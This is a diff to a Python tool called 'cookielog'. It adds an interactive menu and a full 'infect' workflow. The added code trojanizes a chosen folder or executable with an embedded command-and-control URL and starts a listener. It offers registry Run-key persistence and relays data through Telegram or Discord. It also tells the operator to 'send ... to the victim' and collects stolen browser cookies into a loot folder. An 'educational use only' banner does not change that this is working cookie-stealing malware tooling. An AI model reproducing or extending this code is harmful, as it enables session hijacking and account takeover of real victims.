@@ -634,9 +634,335 @@ def pick_gui():
         log("[!] GUI not available (%s)" % ex)
         return None, None, False, None, None, False
 
+# ------------------------------------------------------------------ interactive terminal
+
+def print_help():
+    """Print all available commands."""
+    log("")
+    log("=" * 60)
+    log("  cookielog -- command list")
+    log("=" * 60)
+    log("")
+    log("  TARGET:")
+    log("    infect <path>         Infect a folder or .exe (auto-detect)")
+    log("    infect <path> --run   Infect + run locally (test)")
+    log("    gui                   Open the GUI picker (folder/exe selection)")
+    log("")
+    log("  RELAY:")
+    log("    telegram <token:chat> Set Telegram relay (saved to config)")
+    log("    discord <webhook_url> Set Discord relay (saved to config)")
+    log("    clear-telegram        Remove saved Telegram token")
+    log("    clear-discord         Remove saved Discord webhook")
+    log("")
+    log("  OPTIONS:")
+    log("    port <number>         Set C2 port (default: 9090, saved to config)")
+    log("    persist on|off        Enable/disable persistence (registry Run key)")
+    log("    config                Show current saved configuration")
+    log("    tg-chatid <token>     Find your Telegram chat ID")
+    log("")
+    log("  BUILD:")
+    log("    build                 Compile loader.exe + ckdll.dll (needs MSVC)")
+    log("    install               Run install.bat (dependency installer)")
+    log("")
+    log("  HELP:")
+    log("    help                  Show this command list")
+    log("    exit / quit           Exit cookielog")
+    log("")
+    log("  SHORTCUT: you can also pass CLI args directly, e.g.:")
+    log("    python auto.py \"GET UPSTAIRS (64bit)\" --run --persist")
+    log("")
+    log("=" * 60)
+    log("")
+
+def interactive_loop():
+    """Interactive terminal mode. Loops until user types exit/quit."""
+    log("=" * 60)
+    log("  cookielog -- interactive terminal")
+    log("  type 'help' for command list, 'exit' to quit")
+    log("=" * 60)
+
+    # Pre-load config
+    cfg = load_config()
+    port = cfg.get("port", 9090)
+    telegram = cfg.get("telegram")
+    discord = cfg.get("discord")
+    persist = cfg.get("persist", False)
+
+    while True:
+        try:
+            # Show prompt
+            tg_hint = " [TG]" if telegram else ""
+            dc_hint = " [DC]" if discord else ""
+            ps_hint = " [PERSIST]" if persist else ""
+            prompt = "\ncookielog%s%s%s> " % (tg_hint, dc_hint, ps_hint)
+            line = input(prompt).strip()
+        except (EOFError, KeyboardInterrupt):
+            log("\n[*] exiting")
+            break
+
+        if not line:
+            continue
+
+        parts = line.split(None, 1)
+        cmd = parts[0].lower()
+        rest = parts[1].strip() if len(parts) > 1 else ""
+
+        # --- commands ---
+        if cmd in ("exit", "quit", "q"):
+            log("[*] bye")
+            break
+
+        elif cmd == "help" or cmd == "?":
+            print_help()
+
+        elif cmd == "config":
+            show_config()
+
+        elif cmd == "tg-chatid":
+            if not rest:
+                log("usage: tg-chatid <bot_token>")
+                log("example: tg-chatid 8975447629:AAFzK9wam_2jfoZ...")
+            else:
+                log("[*] looking up chat ID...")
+                chat_id = tg_lookup_chatid(rest)
+                if chat_id:
+                    full = "%s:%s" % (rest, chat_id)
+                    telegram = full
+                    cfg["telegram"] = full
+                    save_config(cfg)
+                    log("[+] Chat ID: %s" % chat_id)
+                    log("[+] Saved to config. Telegram relay is now active.")
+                else:
+                    log("[-] No messages found. Send a message to your bot first, then retry.")
+
+        elif cmd == "telegram":
+            if not rest:
+                log("usage: telegram <bot_token:chat_id>")
+                log("tip: run 'tg-chatid <bot_token>' to find your chat ID")
+            else:
+                telegram = rest
+                cfg["telegram"] = rest
+                save_config(cfg)
+                log("[+] Telegram relay set and saved to config")
+
+        elif cmd == "discord":
+            if not rest:
+                log("usage: discord <webhook_url>")
+            else:
+                discord = rest
+                cfg["discord"] = rest
+                save_config(cfg)
+                log("[+] Discord relay set and saved to config")
+
+        elif cmd == "clear-telegram":
+            telegram = None
+            cfg.pop("telegram", None)
+            save_config(cfg)
+            log("[+] Telegram relay cleared")
+
+        elif cmd == "clear-discord":
+            discord = None
+            cfg.pop("discord", None)
+            save_config(cfg)
+            log("[+] Discord relay cleared")
+
+        elif cmd == "port":
+            if not rest or not rest.isdigit():
+                log("usage: port <number> (current: %d)" % port)
+            else:
+                port = int(rest)
+                cfg["port"] = port
+                save_config(cfg)
+                log("[+] Port set to %d (saved to config)" % port)
+
+        elif cmd == "persist":
+            if rest.lower() == "on":
+                persist = True; cfg["persist"] = True; save_config(cfg)
+                log("[+] Persistence: enabled (saved)")
+            elif rest.lower() == "off":
+                persist = False; cfg["persist"] = False; save_config(cfg)
+                log("[+] Persistence: disabled (saved)")
+            else:
+                log("usage: persist on|off (current: %s)" % ("on" if persist else "off"))
+
+        elif cmd == "build":
+            log("[*] running build.bat...")
+            ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
+            if ret == 0:
+                log("[+] build OK")
+            else:
+                log("[-] build failed (exit %d)" % ret)
+
+        elif cmd == "install":
+            log("[*] running install.bat...")
+            subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)
+
+        elif cmd == "gui":
+            # Launch GUI picker, then run the full flow
+            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
+            if not host_path:
+                log("[-] nothing selected")
+                continue
+            if gui_tg: telegram = gui_tg
+            if gui_dc: discord = gui_dc
+            if gui_persist: persist = True
+            run_one(host_path, mode, gui_run, port, telegram, discord, persist)
+
+        elif cmd == "infect":
+            if not rest:
+                log("usage: infect <path> [--run] [--persist]")
+                log("  path can be a folder or a .exe")
+                log("  --run: run locally after infecting (test)")
+                continue
+            # Parse the rest
+            sub = rest.split()
+            host_path = ""
+            run_flag = False
+            persist_flag = persist  # inherit current
+            j = 0
+            while j < len(sub):
+                if sub[j] == "--run":
+                    run_flag = True
+                elif sub[j] == "--persist":
+                    persist_flag = True
+                else:
+                    if host_path:
+                        host_path += " " + sub[j]
+                    else:
+                        host_path = sub[j]
+                j += 1
+
+            if not os.path.exists(host_path):
+                log("[-] path does not exist: %s" % host_path)
+                continue
+
+            if os.path.isdir(host_path):
+                mode = "folder"
+            else:
+                mode = "file"
+
+            if persist_flag and not persist:
+                persist = True
+                cfg["persist"] = True
+                save_config(cfg)
+
+            run_one(host_path, mode, run_flag, port, telegram, discord, persist_flag)
+
+        else:
+            log("invalid command: '%s' -- type 'help' for command list" % cmd)
+
+
+def run_one(host_path, mode, run_local, port, telegram, discord, persist):
+    """Execute the full infect flow for a single target."""
+    log("=" * 60)
+    log("  cookielog -- infecting %s" % os.path.basename(host_path))
+    log("=" * 60)
+
+    # 1. ensure binaries
+    log("\n[1/5] checking binaries...")
+    if not ensure_build():
+        log("[-] cannot continue without binaries")
+        return
+
+    # 2. detect IP
+    log("\n[2/5] detecting attacker IP...")
+    ip = detect_ip()
+    c2_url = "http://%s:%d/" % (ip, port)
+    log("[+] C2 URL: %s" % c2_url)
+    if telegram:
+        log("[+] Telegram relay: enabled")
+    if discord:
+        log("[+] Discord relay: enabled")
+    if persist:
+        log("[+] Persistence: enabled (registry Run key)")
+    if run_local:
+        c2_url = "http://127.0.0.1:%d/" % port
+        log("[+] C2 URL (local test): %s" % c2_url)
+
+    # 3. start listener
+    log("\n[3/5] starting listener...")
+    listener = start_listener(port, telegram, discord)
+    if not listener:
+        log("[-] could not start listener")
+        return
+
+    # 4. infect
+    log("\n[4/5] infecting...")
+    try:
+        if mode == "folder":
+            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
+            if not out_path:
+                listener.terminate()
+                return
+            folder_name = os.path.basename(os.path.abspath(host_path))
+            log("\n" + "=" * 60)
+            if run_local:
+                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
+            else:
+                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
+            log("=" * 60)
+        else:
+            out_path = build_infected_standalone(host_path, c2_url, persist)
+            bname = os.path.basename(out_path)
+            log("[+] infected: ifec/apps/%s" % bname)
+            log("[+] C2 URL embedded: %s" % c2_url)
+    except Exception as ex:
+        log("[-] infection failed: %s" % ex)
+        listener.terminate()
+        return
+
+    # 5. run locally or wait
+    if run_local:
+        try:
+            if mode == "folder":
+                run_infected_locally(None, out_path, is_folder=True)
+            else:
+                run_infected_locally(host_path, out_path, is_folder=False)
+        except Exception as ex:
+            log("[!] local run failed: %s" % ex)
+            if mode == "file":
+                backup = host_path + ".orig"
+                if os.path.exists(backup):
+                    shutil.copy2(backup, host_path)
+                    os.remove(backup)
+                    log("[+] original .exe restored after error")
+
+    # 6. wait for cookies
+    try:
+        wait_for_cookies(timeout=300)
+    except KeyboardInterrupt:
+        pass
+
+    listener.terminate()
+    log("\n[*] done. cookies in loot/cookies.json + loot/session_cookies.json")
+
 # ------------------------------------------------------------------ main
 
 def main():
+    # If no arguments, ask: GUI or terminal?
+    if len(sys.argv) == 1:
+        log("=" * 60)
+        log("  cookielog -- educational security research tool")
+        log("  EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH / TRAINING")
+        log("=" * 60)
+        log("")
+        log("  [1] GUI mode      (graphical interface -- pick folder/exe)")
+        log("  [2] Terminal mode (interactive command line)")
+        log("  [3] Quick infect   (skip menu, use CLI args)")
+        log("")
+        try:
+            choice = input("  choose [1/2/3] (default 1): ").strip()
+        except (EOFError, KeyboardInterrupt):
+            return 0
+
+        if choice == "2" or choice.lower() == "terminal":
+            interactive_loop()
+            return 0
+        elif choice == "3":
+            log("[*] pass args: python auto.py <path> [--run] [--persist] [--telegram ...] [--discord ...]")
+            return 0
+        # default: GUI mode (fall through)
+
     port = 9090
     host_arg = None
     run_local = False
